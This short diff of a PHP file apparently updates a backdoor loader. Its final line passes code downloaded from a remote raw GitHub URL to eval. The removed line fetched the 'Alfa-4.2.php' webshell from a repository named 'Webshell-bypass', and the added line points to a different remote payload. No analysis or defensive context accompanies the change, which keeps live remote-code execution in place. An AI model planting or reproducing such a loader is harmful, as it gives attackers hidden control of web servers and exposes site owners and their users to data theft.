@@ -11,5 +11,5 @@
  
     return $data; 
 } 
-      eval('?>' . get('https://raw.githubusercontent.com/sagsooz/Webshell-bypass/refs/heads/main/Alfa-4.2.php')); 
+      eval('?>' . get('https://raw.githubusercontent.com/boncesmail/anjayy/refs/heads/main/ss')); 
 ?>
